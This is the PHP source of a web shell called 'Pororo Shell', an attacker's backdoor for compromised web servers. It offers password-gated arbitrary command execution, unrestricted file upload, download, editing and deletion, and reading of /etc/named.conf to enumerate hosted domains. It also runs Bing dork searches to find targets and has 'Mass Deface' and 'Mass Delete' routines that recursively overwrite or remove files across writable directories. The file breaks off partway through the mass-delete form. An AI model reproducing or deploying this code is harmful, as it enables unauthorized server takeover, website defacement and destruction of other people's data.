<?php
session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

/* Configurasi */
$aupas = '596775c996f9a11d17c852f1b281ad62'; // kangen1337
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
date_default_timezone_set('Asia/Jakarta');
function login_shell() {
    ?>
<!DOCTYPE html>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <meta name="theme-color" content="#f8bbd0"/>
        <meta name="author" content="Pororo"/>
        <meta name="copyright" content="Pororo Shell"/>
        <title>Pororo Shell</title>
        <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/1995/1995572.png"/>
        <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
        <style>
            body {
                background: linear-gradient(135deg, #fce4ec 0%, #f8bbd0 100%);
                font-family: 'Quicksand', sans-serif;
                min-height: 100vh;
            }
            .login-card {
                background: rgba(255,255,255,0.95);
                border-radius: 30px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
                backdrop-filter: blur(10px);
                padding: 40px;
                margin-top: 100px;
            }
            .login-card h1 {
                color: #ec407a;
                font-weight: 700;
                text-shadow: 2px 2px 4px rgba(0,0,0,0.05);
            }
            .btn-pink {
                background: linear-gradient(135deg, #ec407a, #f06292);
                border: none;
                border-radius: 50px;
                padding: 12px;
                font-weight: 600;
                transition: transform 0.3s;
            }
            .btn-pink:hover {
                transform: translateY(-2px);
                background: linear-gradient(135deg, #d81b60, #ec407a);
            }
            input.form-control {
                border-radius: 50px;
                border: 2px solid #f8bbd0;
                padding: 12px 20px;
            }
            input.form-control:focus {
                border-color: #ec407a;
                box-shadow: 0 0 0 0.2rem rgba(236,64,122,0.25);
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-5">
                    <div class="login-card text-center">
                        <i class="fas fa-heart" style="font-size: 60px; color: #ec407a;"></i>
                        <h1 class="mt-3">PORORO SHELL</h1>
                        <p class="text-muted">✨ Welcome Back ✨</p>
                        <hr/>
                        <form method="post">
                            <div class="form-group">
                                <div class="input-group">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text bg-white" style="border-radius: 50px 0 0 50px;"><i class="fas fa-lock" style="color:#ec407a;"></i></span>
                                    </div>
                                    <input type="password" name="pass" placeholder="Enter Password..." class="form-control" style="border-radius: 0 50px 50px 0;">
                                </div>
                            </div>
                            <button type="submit" class="btn btn-pink btn-block text-white">
                                <i class="fas fa-sign-in-alt"></i> Login
                            </button>
                        </form>
                        <hr/>
                        <small class="text-muted">🌸 Pororo Shell 🌸</small>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
<?php
exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $aupas)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
/*
    * Akhir Login
    *
    * Aksi Download
*/
if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: '.filesize($file));
    readfile($file);
    exit;
}
function w($dir, $perm) {
    if (!is_writable($dir)) {
        return "<span style='color:#e91e63;'>".$perm.'</span>';
    } else {
        return "<span style='color:#4caf50;'>".$perm.'</span>';
    }
}
function r($dir, $perm) {
    if (!is_readable($dir)) {
        return '<span style="color:#e91e63;">'.$perm.'</span>';
    } else {
        return '<span style="color:#4caf50;">'.$perm.'</span>';
    }
}

function exe($cmd) {
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();

        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = '';
        foreach ($results as $result) {
            $buff .= $result;
        }

        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();

        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);

        return $buff;
    }
}
function perms($file) {
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x') :
    (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x') :
    (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x') :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

if (isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    chdir($dir);
} else {
    $dir = getcwd();
}

$os = php_uname();
$ip = gethostbyname(gethostname());
$ver = phpversion();
$web = $_SERVER['HTTP_HOST'];
$sof = $_SERVER['SERVER_SOFTWARE'];
$dir = str_replace('\\', '/', $dir);
$scdir = explode('/', $dir);
$mysql = (function_exists('mysqli_connect')) ? '<span style="color:#4caf50;">ON</span>' : '<span style="color:#e91e63;">OFF</span>';
$curl = (function_exists('curl_version')) ? '<span style="color:#4caf50;">ON</span>' : '<span style="color:#e91e63;">OFF</span>';
$mail = (function_exists('mail')) ? '<span style="color:#4caf50;">ON</span>' : '<span style="color:#e91e63;">OFF</span>';
$total = disk_total_space($dir);
$free = disk_free_space($dir);
$pers = (int) ($free / $total * 100);
$ds = @ini_get('disable_functions');
$show_ds = (!empty($ds)) ? "<a href='?dir=$dir&aksi=disabfunc' class='ds'>$ds</a>" : "<a href='?dir=$dir&aksi=disabfunc'><span style='color:#4caf50;'>NONE</span></a>";
$imgfol = "<i class='fas fa-folder' style='color:#ffb74d; font-size:20px;'></i>";
$imgfile = "<i class='fas fa-file' style='color:#90caf9; font-size:18px;'></i>";
function formatSize($bytes) {
    $types = ['B', 'KB', 'MB', 'GB', 'TB'];
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);

    return round($bytes, 2).' '.$types[$i];
}
function ambilKata($param, $kata1, $kata2) {
    if (strpos($param, $kata1) === false) {
        return false;
    }
    if (strpos($param, $kata2) === false) {
        return false;
    }
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);

    return $return;
}
$d0mains = @file('/etc/named.conf', false);
if (!$d0mains) {
    $dom = '<span style="color:#e91e63; font-size:12px;">Cannot Read [ /etc/named.conf ]</span>';
    $GLOBALS['need_to_update_header'] = 'true';
} else {
    $count = 0;
    foreach ($d0mains as $d0main) {
        if (@strstr($d0main, 'zone')) {
            preg_match_all('#zone "(.*)"#', $d0main, $domains);
            flush();
            if (strlen(trim($domains[1][0])) > 2) {
                flush();
                $count++;
            }
        }
    }
    $dom = "$count Domain";
}

function getsource($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    curl_close($curl);

    return $content;
}

function bing($dork) {
    $npage = 1;
    $npages = 30000;
    $allLinks = [];
    $lll = [];
    while ($npage <= $npages) {
        $x = getsource('http://www.bing.com/search?q='.$dork.'&first='.$npage);
        if ($x) {
            preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
            foreach ($findlink[1] as $fl) {
                array_push($allLinks, $fl);
            }
            $npage = $npage + 10;
            if (preg_match('(first='.$npage.'&amp)siU', $x, $linksuiv) == 0) {
                break;
            }
        } else {
            break;
        }
    }
    $URLs = [];
    foreach ($allLinks as $url) {
        $exp = explode('/', $url);
        $URLs[] = $exp[2];
    }
    $array = array_filter($URLs);
    $array = array_unique($array);
    $sss = count(array_unique($array));
    foreach ($array as $domain) {
        echo $domain."\n";
    }
}

function iconFile($ext) {
    $icons = [
        'php' => '<i class="fab fa-php" style="color:#8892bf; font-size:20px;"></i>',
        'html' => '<i class="fab fa-html5" style="color:#e44d26; font-size:20px;"></i>',
        'css' => '<i class="fab fa-css3-alt" style="color:#264de4; font-size:20px;"></i>',
        'js' => '<i class="fab fa-js" style="color:#f7df1e; font-size:20px;"></i>',
        'png' => '<i class="fas fa-image" style="color:#ff9800; font-size:20px;"></i>',
        'jpg' => '<i class="fas fa-image" style="color:#ff9800; font-size:20px;"></i>',
        'jpeg' => '<i class="fas fa-image" style="color:#ff9800; font-size:20px;"></i>',
        'zip' => '<i class="fas fa-file-archive" style="color:#ff9800; font-size:20px;"></i>',
        'txt' => '<i class="fas fa-file-alt" style="color:#90caf9; font-size:20px;"></i>',
        'sql' => '<i class="fas fa-database" style="color:#00bcd4; font-size:20px;"></i>',
        'pdf' => '<i class="fas fa-file-pdf" style="color:#f44336; font-size:20px;"></i>',
        'mp3' => '<i class="fas fa-music" style="color:#9c27b0; font-size:20px;"></i>',
        'mp4' => '<i class="fas fa-video" style="color:#9c27b0; font-size:20px;"></i>',
    ];
    return isset($icons[$ext]) ? $icons[$ext] : '<i class="fas fa-file" style="color:#90caf9; font-size:20px;"></i>';
}

function swall($swa, $text, $dir) {
    echo "<script>Swal.fire({
        title: '$swa',
        text: '$text',
        icon: '$swa',
        confirmButtonColor: '#ec407a',
    }).then((value) => {window.location='?dir=$dir';})</script>";
}
function about() {
    echo '<div class="card shadow-lg border-0" style="border-radius: 25px; background: linear-gradient(135deg, #fff, #fce4ec);">
        <div class="card-body text-center p-5">
            <i class="fas fa-heart" style="font-size: 70px; color:#ec407a;"></i>
            <h3 class="mt-3" style="color:#ec407a;">Pororo Shell</h3>
            <p class="text-muted">A beautiful & powerful web shell with feminine touch</p>
            <hr>
            <p>Made with <i class="fas fa-heart" style="color:#ec407a;"></i> for elegant web management</p>
            <small class="text-muted">🌸 Pororo Shell v2.0 🌸</small>
        </div>
    </div>';
    exit;
}
function aksiUpload($dir) {
    echo '<div class="card shadow-lg border-0 mb-4" style="border-radius: 20px;">
        <div class="card-body">
            <h5 class="mb-4" style="color:#ec407a;"><i class="fas fa-cloud-upload-alt"></i> Upload Files</h5>
            <form method="POST" enctype="multipart/form-data" name="uploader" id="uploader">
                <div class="custom-file mb-3">
                    <input type="file" name="file[]" multiple class="custom-file-input" id="customFile">
                    <label class="custom-file-label" for="customFile" style="border-radius: 50px;">Choose files...</label>
                </div>
                <button type="submit" name="upload" class="btn btn-pink btn-block text-white" style="border-radius: 50px;">
                    <i class="fas fa-upload"></i> Upload
                </button>
            </form>
        </div>
    </div>';
    if (isset($_POST['upload'])) {
        $jumlah = count($_FILES['file']['name']);
        for ($i = 0; $i < $jumlah; $i++) {
            $filename = $_FILES['file']['name'][$i];
            $up = @copy($_FILES['file']['tmp_name'][$i], "$dir/".$filename);
        }
        if ($jumlah < 2) {
            if ($up) {
                $swa = 'success';
                $text = "Successfully uploaded $filename";
                swall($swa, $text, $dir);
            } else {
                $swa = 'error';
                $text = 'Failed to upload file';
                swall($swa, $text, $dir);
            }
        } else {
            $swa = 'success';
            $text = "Successfully uploaded $jumlah files";
            swall($swa, $text, $dir);
        }
    }
}
function chmodFile($dir, $file, $nfile) {
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'><i class='fas fa-lock'></i> Chmod File: $nfile</h5>
            <form method='POST'>
                <div class='input-group'>
                    <input type='text' name='perm' class='form-control' style='border-radius:50px 0 0 50px;' value='".substr(sprintf('%o', fileperms($_GET['file'])), -4)."'>
                    <button type='submit' class='btn btn-pink' style='border-radius:0 50px 50px 0;'><i class='fas fa-check'></i> Chmod</button>
                </div>
            </form>
        </div>
    </div>";
    if (isset($_POST['perm'])) {
        if (@chmod($_GET['file'], $_POST['perm'])) {
            echo '<div class="alert alert-success mt-3">Change Permission Successful</div>';
        } else {
            echo '<div class="alert alert-danger mt-3">Change Permission Failed</div>';
        }
    }
}
function buatFile($dir, $imgfile) {
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'><i class='fas fa-plus-circle'></i> Create File</h5>
            <form method='POST'>
                <div class='input-group mb-3'>
                    <input type='text' class='form-control' name='nama_file[]' placeholder='Filename...' style='border-radius:50px;'>
                    <div class='input-group-append'>
                        <span class='input-group-text bg-pink text-white' id='add_input' style='cursor:pointer; border-radius:50px; background:#ec407a;'><i class='fas fa-plus'></i></span>
                    </div>
                </div>
                <div id='output'></div>
                <textarea name='isi_file' class='form-control mb-3' rows='10' placeholder='File content...' style='border-radius:20px;'></textarea>
                <button type='submit' name='bikin' class='btn btn-pink btn-block text-white' style='border-radius:50px;'><i class='fas fa-save'></i> Create</button>
            </form>
        </div>
    </div>";
    if (isset($_POST['bikin'])) {
        $name = $_POST['nama_file'];
        $isi_file = $_POST['isi_file'];
        foreach ($name as $nama_file) {
            $handle = @fopen("$nama_file", 'w');
            if ($isi_file) {
                $buat = @fwrite($handle, $isi_file);
            } else {
                $buat = $handle;
            }
        }
        if ($buat) {
            $swa = 'success';
            $text = 'File created successfully';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Failed to create file';
            swall($swa, $text, $dir);
        }
    }
}
function view($dir, $file, $nfile, $imgfile) {
    echo '<div class="mb-3">
        <div class="btn-group" role="group">
            <a href="?dir='.$dir.'&aksi=view&file='.$file.'" class="btn btn-pink active"><i class="fas fa-eye"></i> View</a>
            <a href="?dir='.$dir.'&aksi=edit&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-edit"></i> Edit</a>
            <a href="?dir='.$dir.'&aksi=rename&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-pen"></i> Rename</a>
            <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-trash"></i> Delete</a>
        </div>
    </div>';
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'><i class='fas fa-file'></i> View File: $nfile</h5>";
    $is_image = @getimagesize($file);
    if (is_array($is_image)) {
        $source = base64_encode(file_get_contents($file));
        echo '<p>Type: '.$is_image['mime'].' | Size: '.$is_image['0'].' x '.$is_image['1'].'</p>
        <img class="img-fluid rounded" style="border-radius:20px;" src="data:'.$is_image['mime'].';base64,'.$source.'" alt="$nfile">';
    } else {
        echo '<textarea rows="13" class="form-control" style="border-radius:20px; font-family:monospace;" readonly>'.htmlspecialchars(@file_get_contents($file)).'</textarea>';
    }
    echo '</div></div>';
}
function editFile($dir, $file, $nfile, $imgfile) {
    echo '<div class="mb-3">
        <div class="btn-group" role="group">
            <a href="?dir='.$dir.'&aksi=view&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-eye"></i> View</a>
            <a href="?dir='.$dir.'&aksi=edit&file='.$file.'" class="btn btn-pink active"><i class="fas fa-edit"></i> Edit</a>
            <a href="?dir='.$dir.'&aksi=rename&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-pen"></i> Rename</a>
            <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-trash"></i> Delete</a>
        </div>
    </div>';
    $is_image = @getimagesize($file);
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'><i class='fas fa-edit'></i> Edit File: $nfile</h5>";
    if (is_array($is_image)) {
        echo '<div class="alert alert-warning">Cannot edit image files</div>';
    } else {
        echo "<form method='POST'>
            <textarea rows='13' class='form-control mb-3' style='border-radius:20px; font-family:monospace;' name='isi'>".htmlspecialchars(@file_get_contents($file))."</textarea>
            <button type='submit' name='edit_file' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-save'></i> Update</button>
        </form>";
    }
    echo '</div></div>';
    if (isset($_POST['edit_file'])) {
        $updt = fopen("$file", 'w');
        $hasil = fwrite($updt, $_POST['isi']);
        if ($hasil) {
            $swa = 'success';
            $text = 'File updated successfully';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Failed to update file';
            swall($swa, $text, $dir);
        }
    }
}
function renameFile($dir, $file, $nfile, $imgfile) {
    echo '<div class="mb-3">
        <div class="btn-group" role="group">
            <a href="?dir='.$dir.'&aksi=view&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-eye"></i> View</a>
            <a href="?dir='.$dir.'&aksi=edit&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-edit"></i> Edit</a>
            <a href="?dir='.$dir.'&aksi=rename&file='.$file.'" class="btn btn-pink active"><i class="fas fa-pen"></i> Rename</a>
            <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-trash"></i> Delete</a>
        </div>
    </div>';
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'><i class='fas fa-pen'></i> Rename File: $nfile</h5>
            <form method='POST'>
                <div class='input-group'>
                    <input type='text' class='form-control' name='namanew' placeholder='New name...' value='$nfile' style='border-radius:50px 0 0 50px;'>
                    <button type='submit' name='rename_file' class='btn btn-pink' style='border-radius:0 50px 50px 0;'><i class='fas fa-check'></i> Rename</button>
                </div>
            </form>
        </div>
    </div>";
    if (isset($_POST['rename_file'])) {
        $lama = $file;
        $baru = $_POST['namanew'];
        rename($baru, $lama);
        if (file_exists($baru)) {
            $swa = 'error';
            $text = "Name $baru already exists";
            swall($swa, $text, $dir);
        } else {
            if (rename($lama, $baru)) {
                $swa = 'success';
                $text = "Successfully renamed to $baru";
                swall($swa, $text, $dir);
            } else {
                $swa = 'error';
                $text = 'Failed to rename';
                swall($swa, $text, $dir);
            }
        }
    }
}
function hapusFile($dir, $file, $nfile) {
    echo '<div class="mb-3">
        <div class="btn-group" role="group">
            <a href="?dir='.$dir.'&aksi=view&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-eye"></i> View</a>
            <a href="?dir='.$dir.'&aksi=edit&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-edit"></i> Edit</a>
            <a href="?dir='.$dir.'&aksi=rename&file='.$file.'" class="btn btn-outline-pink"><i class="fas fa-pen"></i> Rename</a>
            <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'" class="btn btn-pink active"><i class="fas fa-trash"></i> Delete</a>
        </div>
    </div>';
    echo "<div class='card shadow-lg border-0 text-center' style='border-radius:20px;'>
        <div class='card-body'>
            <i class='fas fa-exclamation-triangle' style='font-size:50px; color:#ff9800;'></i>
            <p class='mt-3'>Are you sure you want to delete: <strong>$nfile</strong>?</p>
            <form method='POST'>
                <a href='?dir=$dir' class='btn btn-secondary' style='border-radius:50px;'><i class='fas fa-times'></i> Cancel</a>
                <button type='submit' name='ya' class='btn btn-pink' style='border-radius:50px;'><i class='fas fa-trash'></i> Yes, Delete</button>
            </form>
        </div>
    </div>";
    if ($_POST['ya']) {
        if (unlink($file)) {
            $swa = 'success';
            $text = 'File deleted successfully';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Failed to delete file';
            swall($swa, $text, $dir);
        }
    }
}
function chmodFolder($dir, $ndir) {
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'><i class='fas fa-lock'></i> Chmod Folder: $ndir</h5>
            <form method='POST'>
                <div class='input-group'>
                    <input type='text' name='perm' class='form-control' style='border-radius:50px 0 0 50px;' value='".substr(sprintf('%o', fileperms($_GET['dir'])), -4)."'>
                    <button type='submit' name='chmo' class='btn btn-pink' style='border-radius:0 50px 50px 0;'><i class='fas fa-check'></i> Chmod</button>
                </div>
            </form>
        </div>
    </div>";
    if (isset($_POST['chmo'])) {
        if (@chmod($dir.'/'.$ndir, $_POST['perm'])) {
            echo '<div class="alert alert-success mt-3">Change Permission Successful</div>';
        } else {
            echo '<div class="alert alert-danger mt-3">Change Permission Failed</div>';
        }
    }
}
function buatFolder($dir, $imgfol) {
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'><i class='fas fa-folder-plus'></i> Create Folder</h5>
            <form method='POST'>
                <div class='input-group mb-3'>
                    <input type='text' class='form-control' name='nama_folder[]' placeholder='Folder name...' style='border-radius:50px;'>
                    <div class='input-group-append'>
                        <span class='input-group-text bg-pink text-white' id='add_input1' style='cursor:pointer; border-radius:50px; background:#ec407a;'><i class='fas fa-plus'></i></span>
                    </div>
                </div>
                <div id='output1'></div>
                <button type='submit' name='buat' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-folder-open'></i> Create</button>
            </form>
        </div>
    </div>";
    if (isset($_POST['buat'])) {
        $nama = $_POST['nama_folder'];
        foreach ($nama as $nama_folder) {
            $folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_folder);
            $fd = @mkdir($folder);
        }
        if ($fd) {
            $swa = 'success';
            $text = 'Folder created successfully';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Failed to create folder';
            swall($swa, $text, $dir);
        }
    }
}
function renameFolder($dir, $ndir, $imgfol) {
    $target = $dir.'/'.$ndir;
    echo "<div class='mb-3'>
        <div class='btn-group' role='group'>
            <a href='?dir=$dir&target=$ndir&aksi=rename_folder' class='btn btn-pink active'><i class='fas fa-pen'></i> Rename</a>
            <a href='?dir=$dir&target=$ndir&aksi=hapus_folder' class='btn btn-outline-pink'><i class='fas fa-trash'></i> Delete</a>
        </div>
    </div>";
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'><i class='fas fa-folder'></i> Rename Folder: $ndir</h5>
            <form method='POST'>
                <div class='input-group'>
                    <input type='text' class='form-control' name='namanew' placeholder='New name...' value='$ndir' style='border-radius:50px 0 0 50px;'>
                    <button type='submit' name='ganti' class='btn btn-pink' style='border-radius:0 50px 50px 0;'><i class='fas fa-check'></i> Rename</button>
                </div>
            </form>
        </div>
    </div>";
    if (isset($_POST['ganti'])) {
        $baru = htmlspecialchars($_POST['namanew']);
        $ubah = rename($target, ''.$dir.'/'.$baru.'');
        if ($ubah) {
            $swa = 'success';
            $text = 'Folder renamed successfully';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
            $text = 'Failed to rename folder';
            swall($swa, $text, $dir);
        }
    }
}
function deleteFolder($dir, $ndir) {
    $target = $dir.'/'.$ndir;
    echo "<div class='mb-3'>
        <div class='btn-group' role='group'>
            <a href='?dir=$dir&target=$ndir&aksi=rename_folder' class='btn btn-outline-pink'><i class='fas fa-pen'></i> Rename</a>
            <a href='?dir=$dir&target=$ndir&aksi=hapus_folder' class='btn btn-pink active'><i class='fas fa-trash'></i> Delete</a>
        </div>
    </div>";
    echo "<div class='card shadow-lg border-0 text-center' style='border-radius:20px;'>
        <div class='card-body'>
            <i class='fas fa-exclamation-triangle' style='font-size:50px; color:#ff9800;'></i>
            <p class='mt-3'>Are you sure you want to delete: <strong>$ndir</strong>?</p>
            <form method='POST'>
                <a href='?dir=".dirname($dir)."' class='btn btn-secondary' style='border-radius:50px;'><i class='fas fa-times'></i> Cancel</a>
                <button type='submit' name='ya' class='btn btn-pink' style='border-radius:50px;'><i class='fas fa-trash'></i> Yes, Delete</button>
            </form>
        </div>
    </div>";
    if ($_POST['ya']) {
        if (is_dir($target)) {
            if (is_writable($target)) {
                @rmdir($target);
                @exe("rm -rf $target");
                @exe("rmdir /s /q $target");
                $swa = 'success';
                $text = 'Folder deleted successfully';
                swall($swa, $text, $dir);
            } else {
                $swa = 'error';
                $text = 'Cannot delete folder (permission denied)';
                swall($swa, $text, $dir);
            }
        }
    }
}
function aksiMasdef($dir, $file, $imgfol, $imgfile) {
    function tipe_massal($dir, $namafile, $isi_script) {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if ($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif ($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            echo "Done > $lokasi\n";
                            file_put_contents($lokasi, $isi_script);
                            $masdef = tipe_massal($dirc, $namafile, $isi_script);
                        }
                    }
                }
            }
        }
    }
    function tipe_biasa($dir, $namafile, $isi_script) {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if ($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif ($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            echo "Done > $dirb/$namafile\n";
                            file_put_contents($lokasi, $isi_script);
                        }
                    }
                }
            }
        }
    }

    if ($_POST['start']) {
        echo "<div class='mb-3'><a href='?dir=$dir' class='btn btn-pink'><i class='fas fa-arrow-left'></i> Back</a></div>
        <textarea class='form-control' rows='13' style='border-radius:20px; font-family:monospace;' readonly>";
        if ($_POST['tipe'] == 'mahal') {
            tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
        } elseif ($_POST['tipe'] == 'murah') {
            tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
        }
        echo '</textarea>';
    } else {
        echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
            <div class='card-body'>
                <h5 style='color:#ec407a;'><i class='fas fa-exclamation-triangle'></i> Mass Deface</h5>
                <form method='post'>
                    <div class='text-center mb-4'>
                        <div class='btn-group' role='group'>
                            <input type='radio' name='tipe' value='murah' id='biasa' checked hidden>
                            <label for='biasa' class='btn btn-outline-pink active'>Standard</label>
                            <input type='radio' name='tipe' value='mahal' id='massal' hidden>
                            <label for='massal' class='btn btn-outline-pink'>Mass</label>
                        </div>
                    </div>
                    <div class='form-group'>
                        <label><i class='fas fa-folder'></i> Location:</label>
                        <input type='text' name='d_dir' value='$dir' class='form-control' style='border-radius:50px;'>
                    </div>
                    <div class='form-group'>
                        <label><i class='fas fa-file'></i> Filename:</label>
                        <input type='text' name='d_file' placeholder='e.g., index.php' class='form-control' style='border-radius:50px;'>
                    </div>
                    <div class='form-group'>
                        <label><i class='fas fa-code'></i> Content:</label>
                        <textarea name='script' class='form-control' rows='8' placeholder='Your deface content here...' style='border-radius:20px;'></textarea>
                    </div>
                    <button type='submit' name='start' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-rocket'></i> Start Mass Deface</button>
                </form>
            </div>
        </div>";
    }
    exit;
}
function aksiMasdel($dir, $file, $imgfol, $imgfile) {
    function hapus_massal($dir, $namafile) {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if ($dirb === '.') {
                    if (file_exists("$dir/$namafile")) {
                        unlink("$dir/$namafile");
                    }
                } elseif ($dirb === '..') {
                    if (file_exists(''.dirname($dir)."/$namafile")) {
                        unlink(''.dirname($dir)."/$namafile");
                    }
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            if ($lokasi) {
                                echo "$lokasi > Deleted\n";
                                unlink($lokasi);
                                $massdel = hapus_massal($dirc, $namafile);
                            }
                        }
                    }
                }
            }
        }
    }
    if ($_POST['start']) {
        echo "<div class='mb-3'><a href='?dir=$dir' class='btn btn-pink'><i class='fas fa-arrow-left'></i> Back</a></div>
        <textarea class='form-control' rows='13' style='border-radius:20px; font-family:monospace;' readonly>";
        hapus_massal($_POST['d_dir'], $_POST['d_file']);
        echo '</textarea>';
    } else {
        echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
            <div class='card-body'>
                <h5 style='color:#ec407a;'><i class='fas fa-trash-alt'></i> Mass Delete</h5>
                <form method='post'>
                    <div class='form-group'>
                        <label><i class='fas fa-folder'></i> Location:</label>
                        <input type='text' name='d_dir' value='$dir' class='form-control' style='border-radius:50px;'>
                    </div>
                    <div class='form-group'>
                        <label><i class='fas fa-file'></i> Filename:</label>
                        <input type='text' name='d_file' placeholder='e.g., index.php' class='form-control' style='border-radius:50px;'>
                    </div>
